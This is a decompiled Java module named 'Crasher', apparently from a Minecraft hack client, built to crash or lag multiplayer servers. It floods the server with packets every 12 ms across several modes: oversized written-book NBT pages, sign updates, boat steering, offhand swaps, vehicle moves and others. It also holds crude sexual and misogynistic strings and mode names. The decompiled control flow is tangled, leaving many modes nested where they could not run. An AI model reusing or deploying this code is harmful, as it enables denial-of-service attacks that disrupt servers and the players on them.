package fail.mercury.client.client.modules.misc;

import fail.mercury.client.api.module.Module;
import fail.mercury.client.api.module.annotations.ModuleManifest;
import fail.mercury.client.api.module.category.Category;
import fail.mercury.client.api.util.ChatUtil;
import fail.mercury.client.api.util.Util;
import fail.mercury.client.client.events.UpdateEvent;
import me.kix.lotus.property.annotations.Mode;
import me.kix.lotus.property.annotations.Property;
import net.b0at.api.event.EventHandler;
import net.minecraft.client.gui.GuiDisconnected;
import net.minecraft.client.gui.GuiDownloadTerrain;
import net.minecraft.client.gui.GuiMainMenu;
import net.minecraft.client.gui.GuiMultiplayer;
import net.minecraft.client.multiplayer.GuiConnecting;
import net.minecraft.entity.Entity;
import net.minecraft.init.Items;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.CPacketAnimation;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
import net.minecraft.network.play.client.CPacketEntityAction;
import net.minecraft.network.play.client.CPacketHeldItemChange;
import net.minecraft.network.play.client.CPacketPlayerDigging;
import net.minecraft.network.play.client.CPacketPlayerTryUseItem;
import net.minecraft.network.play.client.CPacketPlayerTryUseItemOnBlock;
import net.minecraft.network.play.client.CPacketSteerBoat;
import net.minecraft.network.play.client.CPacketUpdateSign;
import net.minecraft.network.play.client.CPacketVehicleMove;
import net.minecraft.network.play.client.CPacketPlayerDigging.Action;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.EnumHand;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.text.ITextComponent;
import net.minecraft.util.text.ITextComponent.Serializer;

@ModuleManifest(
   label = "Crasher",
   aliases = {"BaldCrash"},
   category = Category.MISC
)
public class Crasher extends Module {
   private ITextComponent line1;
   private ITextComponent line2;
   private ITextComponent line3;
   private ITextComponent line4;
   private ITextComponent[] ohgodohfuck;
   private String color;
   @Property("Mode")
   @Mode({"Book", "BookBypass", "Sign", "Boat", "Offhand", "Entity", "Sneak", "Unnamed", "HitWomen", "ItemSwitch", "ItemUse"})
   public String mode = "Book";
   @Property("Toggle")
   public boolean toggle = true;
   private ItemStack bookObj = null;
   private String message = "ihavesexwithauto!!b54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";

   public void onEnable() {
      this.color = "red";
      this.line1 = Serializer.func_150699_a("{\"text\":\"" + this.message + "\",\"color\":\"" + this.color + "\"}");
      this.line2 = Serializer.func_150699_a("{\"text\":\"" + this.message + "\",\"color\":\"" + this.color + "\"}");
      this.line3 = Serializer.func_150699_a("{\"text\":\"" + this.message + "\",\"color\":\"" + this.color + "\"}");
      this.line4 = Serializer.func_150699_a("{\"text\":\"" + this.message + "\",\"color\":\"" + this.color + "\"}");
      this.ohgodohfuck = new ITextComponent[]{this.line1, this.line2, this.line3, this.line4};
      this.bookObj = new ItemStack(Items.field_151099_bA);
      NBTTagList list = new NBTTagList();
      NBTTagCompound tag = new NBTTagCompound();
      String author = mc.func_110432_I().func_111285_a();
      String title = "\n MercuryOnTop \n";
      String size = this.message;

      int i;
      for(i = 0; i < 50; ++i) {
         NBTTagString tString = new NBTTagString(size);
         list.func_74742_a(tString);
      }

      tag.func_74778_a("author", author);
      tag.func_74778_a("title", title);
      tag.func_74782_a("pages", list);
      this.bookObj.func_77983_a("pages", list);
      this.bookObj.func_77982_d(tag);
      if (this.mode.equalsIgnoreCase("Book")) {
         while(this.isEnabled()) {
            try {
               Util.sendPacket(new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, this.bookObj, (short)0));
               Thread.sleep(12L);
            } catch (InterruptedException var17) {
               var17.printStackTrace();
            }
         }

         if (this.mode.equalsIgnoreCase("BookBypass")) {
            while(this.isEnabled()) {
               try {
                  Util.sendPacket(new CPacketCreativeInventoryAction(36, this.bookObj));
                  Thread.sleep(12L);
               } catch (InterruptedException var16) {
                  var16.printStackTrace();
               }
            }

            if (this.mode.equalsIgnoreCase("Sign")) {
               while(this.isEnabled()) {
                  try {
                     Util.sendPacket(new CPacketUpdateSign(mc.field_71439_g.func_180425_c(), this.ohgodohfuck));
                     Thread.sleep(12L);
                  } catch (InterruptedException var15) {
                     var15.printStackTrace();
                  }
               }
            }
         }

         if (this.mode.equalsIgnoreCase("Boat")) {
            i = 0;

            label152:
            while(true) {
               if (i >= 100) {
                  if (this.mode.equalsIgnoreCase("Offhand")) {
                     try {
                        for(i = 1; i <= 2000; ++i) {
                           mc.field_71439_g.field_71174_a.func_147297_a(new CPacketPlayerDigging(Action.SWAP_HELD_ITEMS, BlockPos.field_177992_a, EnumFacing.DOWN));
                        }
                     } catch (Exception var18) {
                        var18.printStackTrace();
                        this.toggle();
                     }

                     if (this.mode.equalsIgnoreCase("Entity")) {
                        while(this.isEnabled()) {
                           try {
                              Entity ridingEntity = mc.field_71439_g.func_184187_bx();
                              if (ridingEntity == null) {
                                 ChatUtil.print("Entity lag requires player to be on an entity");
                                 this.setEnabled(false);
                                 return;
                              }

                              ridingEntity.field_70165_t = mc.field_71439_g.field_70165_t;
                              ridingEntity.field_70163_u = mc.field_71439_g.field_70163_u + 1330.0D;
                              ridingEntity.field_70161_v = mc.field_71439_g.field_70161_v;
                              mc.field_71439_g.field_71174_a.func_147297_a(new CPacketVehicleMove(ridingEntity));
                              Thread.sleep(12L);
                           } catch (InterruptedException var13) {
                              var13.printStackTrace();
                           }
                        }
                     }

                     if (this.mode.equalsIgnoreCase("Sneak")) {
                        while(this.isEnabled()) {
                           try {
                              Util.sendPacket(new CPacketEntityAction(mc.field_71439_g, net.minecraft.network.play.client.CPacketEntityAction.Action.START_SNEAKING));
                              Util.sendPacket(new CPacketEntityAction(mc.field_71439_g, net.minecraft.network.play.client.CPacketEntityAction.Action.STOP_SNEAKING));
                              Thread.sleep(12L);
                           } catch (InterruptedException var12) {
                              var12.printStackTrace();
                           }
                        }
                     }
                  }

                  if (this.mode.equalsIgnoreCase("Unnamed")) {
                     while(this.isEnabled()) {
                        try {
                           mc.field_71442_b.func_187098_a(0, 0, 0, ClickType.PICKUP_ALL, mc.field_71439_g);
                           Thread.sleep(12L);
                        } catch (InterruptedException var11) {
                           var11.printStackTrace();
                        }
                     }
                  }

                  if (this.mode.equalsIgnoreCase("HitWomen")) {
                     while(this.isEnabled()) {
                        try {
                           Util.sendPacket(new CPacketAnimation(EnumHand.MAIN_HAND));
                           Thread.sleep(12L);
                        } catch (InterruptedException var10) {
                           var10.printStackTrace();
                        }
                     }
                  }

                  if (!this.mode.equalsIgnoreCase("ItemSwitch")) {
                     break;
                  }

                  while(true) {
                     if (!this.isEnabled()) {
                        break label152;
                     }

                     try {
                        Util.sendPacket(new CPacketHeldItemChange(0));
                        Util.sendPacket(new CPacketHeldItemChange(1));
                        Thread.sleep(12L);
                     } catch (InterruptedException var9) {
                        var9.printStackTrace();
                     }
                  }
               }

               while(this.isEnabled()) {
                  try {
                     mc.field_71439_g.field_71174_a.func_147297_a(new CPacketSteerBoat(true, true));
                     Thread.sleep(12L);
                  } catch (InterruptedException var14) {
                     var14.printStackTrace();
                  }
               }

               ++i;
            }
         }

         if (this.mode.equalsIgnoreCase("ItemUse")) {
            while(this.isEnabled()) {
               try {
                  Util.sendPacket(new CPacketPlayerTryUseItem());
                  Util.sendPacket(new CPacketPlayerTryUseItemOnBlock(mc.field_71439_g.func_180425_c(), mc.field_71439_g.func_174811_aO(), mc.field_71439_g.func_184600_cs(), 0.0F, 0.0F, 0.0F));
                  Thread.sleep(12L);
               } catch (InterruptedException var8) {
                  var8.printStackTrace();
               }
            }
         }
      }

   }

   @EventHandler
   public void onUpdate(UpdateEvent event) {
      if (this.toggle && (mc.field_71462_r instanceof GuiMainMenu || mc.field_71462_r instanceof GuiDisconnected || mc.field_71462_r instanceof GuiDownloadTerrain || mc.field_71462_r instanceof GuiConnecting || mc.field_71462_r instanceof GuiMultiplayer)) {
         this.toggle();
      }

   }
}
